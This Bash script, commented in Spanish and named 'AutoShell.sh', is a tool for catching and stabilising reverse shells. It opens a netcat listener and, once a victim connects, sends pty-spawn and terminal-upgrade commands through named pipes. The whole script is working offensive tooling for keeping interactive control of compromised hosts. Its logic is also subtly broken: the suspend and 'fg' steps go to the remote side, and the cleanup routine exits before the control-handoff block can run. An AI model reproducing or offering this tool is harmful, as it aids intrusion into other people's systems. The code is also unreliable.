#!/usr/bin/env bash

# AutoShell.sh - Estabilizador Automático de Reverse Shells
# Versión: 5.0 (Persistencia Mejorada)
set -e
IFS=$'\n\t'

# Configuración
DEFAULT_PORT="4444"
TIMEOUT=30
FIFO_IN="/tmp/input.$RANDOM"
FIFO_OUT="/tmp/output.$RANDOM"

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Variables de estado
STABILIZED=0
CONNECTED=0

# Función de limpieza segura
cleanup() {
    if [[ $STABILIZED -eq 0 ]]; then
        echo -e "\n${YELLOW}[*] Limpiando recursos...${NC}"
        [[ -p "$FIFO_IN" ]] && rm -f "$FIFO_IN"
        [[ -p "$FIFO_OUT" ]] && rm -f "$FIFO_OUT"
        [[ -n $NC_PID ]] && kill -9 $NC_PID 2>/dev/null
    fi
    stty sane 2>/dev/null
    exit 0
}

# Mostrar ayuda
show_help() {
    echo -e "${BLUE}Uso:${NC}"
    echo "  $0 [PUERTO]"
    echo "  $0 [IP] [PUERTO]"
    echo -e "\n${BLUE}Ejemplos:${NC}"
    echo "  $0 192.168.1.10 4444"
    echo "  $0 4444"
    exit 0
}

# Validar IP
validate_ip() {
    [[ "$1" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || [[ "$1" =~ ^[0-9a-fA-F:]+$ ]]
}

# Validar puerto
validate_port() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( "$1" >= 1 && "$1" <= 65535 ))
}

# Obtener parámetros
get_parameters() {
    if [[ $# -eq 1 ]]; then
        validate_port "$1" && PORT="$1" || show_help
    elif [[ $# -eq 2 ]]; then
        validate_ip "$1" && validate_port "$2" && { IP="$1"; PORT="$2"; } || show_help
    else
        show_help
    fi
}

# Verificar dependencias
check_deps() {
    local deps=("nc" "mkfifo" "stty")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${RED}[!] Falta dependencia: $dep${NC}"
            exit 1
        fi
    done
}

# Detectar variante de netcat
get_nc_command() {
    if nc -h 2>&1 | grep -q "\-e"; then
        echo "nc -lvp $PORT"
    else
        echo "nc -lvnp $PORT"
    fi
}

# Estabilizar shell
stabilize_shell() {
    local rows cols
    read rows cols < <(stty size 2>/dev/null || echo "24 80")

    {
        echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null"
        echo "script -qc /bin/bash /dev/null 2>/dev/null"
        sleep 1
        echo -e "\x1A"
        sleep 1
        echo "stty raw -echo"
        echo "fg"
        sleep 1
        echo "export TERM=xterm-256color"
        echo "export SHELL=bash"
        echo "stty rows $rows cols $cols"
        echo "clear"
        echo "echo -e '${GREEN}[+] Shell estabilizada con éxito!${NC}'"
    } > "$FIFO_IN"
}

# Main
trap cleanup SIGINT SIGTERM EXIT

check_deps
get_parameters "$@"
IP="${IP:-0.0.0.0}"
NC_CMD=$(get_nc_command)

# Crear FIFOs
rm -f "$FIFO_IN" "$FIFO_OUT" 2>/dev/null
mkfifo "$FIFO_IN" "$FIFO_OUT"

echo -e "${YELLOW}[*] Iniciando listener en ${IP}:${PORT}${NC}"
echo -e "${YELLOW}[*] Comando: $NC_CMD${NC}"

# Iniciar listener
eval "$NC_CMD < \"$FIFO_IN\" > \"$FIFO_OUT\" 2>&1 &"
NC_PID=$!

# Esperar conexión
echo -e "${YELLOW}[*] Esperando conexión...${NC}"
while IFS= read -r line; do
    echo "$line"
    if [[ "$line" =~ "connect" ]] && (( CONNECTED == 0 )); then
        CONNECTED=1
        echo -e "${GREEN}[+] Conexión establecida${NC}"
        echo -e "${YELLOW}[*] Estabilizando shell...${NC}"
        stabilize_shell
        break
    fi
done < <(timeout "$TIMEOUT" cat "$FIFO_OUT")

# Monitorizar estabilización
if (( CONNECTED == 1 )); then
    {
        while IFS= read -r line; do
            if [[ "$line" == *"[+] Shell estabilizada con éxito!"* ]]; then
                STABILIZED=1
                echo -e "${GREEN}[+] Shell lista! Tomando control...${NC}"
                cleanup
                break
            fi
        done
    } < <(cat "$FIFO_OUT")
fi

# Transferir control al usuario
if (( STABILIZED == 1 )); then
    cat "$FIFO_OUT" &
    cat > "$FIFO_IN"
    wait
fi

cleanup